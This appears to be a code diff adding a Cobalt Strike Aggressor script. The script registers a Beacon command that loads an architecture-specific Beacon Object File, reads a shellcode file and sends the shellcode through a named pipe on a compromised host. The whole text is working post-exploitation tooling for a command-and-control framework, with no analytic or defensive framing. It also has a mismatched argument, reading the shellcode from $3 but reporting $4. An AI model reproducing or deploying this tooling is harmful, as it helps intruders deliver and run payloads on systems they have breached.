@@ -1,0 +1,32 @@
+beacon_command_register(
+"send_shellcode_via_pipe", 
+"Sends a shellcode via a named pipe", 
+"Synopsis: send_shellcode_via_pipe <pipe> <shellcode>");
+
+
+alias send_shellcode_via_pipe {
+	local('$handle $data $args $sc_data');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("send_shellcode_via_pipe. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$sc_handle = openf($3);
+	$sc_data = readb($sc_handle, -1);
+	closef($sc_handle);
+
+	# pack our arguments
+	$args = bof_pack($1, "zb", $2, $sc_data);
+	
+	btask($1, "send_shellcode_via_pipe BOF (@dottor_morte)");
+	btask($1, "Reading shellcode from: $+  $4");
+
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+
